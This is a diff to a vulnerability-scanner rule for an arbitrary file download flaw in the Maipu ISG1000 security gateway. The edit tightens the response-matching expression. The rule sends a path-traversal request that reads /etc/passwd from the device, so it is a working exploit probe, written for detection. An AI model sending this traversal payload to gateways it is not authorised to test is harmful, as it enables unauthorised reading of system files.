@@ -3,7 +3,7 @@ rules:
   - method: GET
     path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
     expression: |
-      response.status == 200 && response.content_type.contains("text/plain") && "root:[x*]:0:0:".bmatches(response.body) || response.body.bcontains(b"root::0:0:")
+      response.status == 200 && response.content_type.contains("text/plain") && response.headers["set-cookie"].contains("USGSESSID=") && "root:[x*]?:0:0:".bmatches(response.body)
 detail:
   author: YekkoY
   description: "迈普 ISG1000安全网关 任意文件下载漏洞"
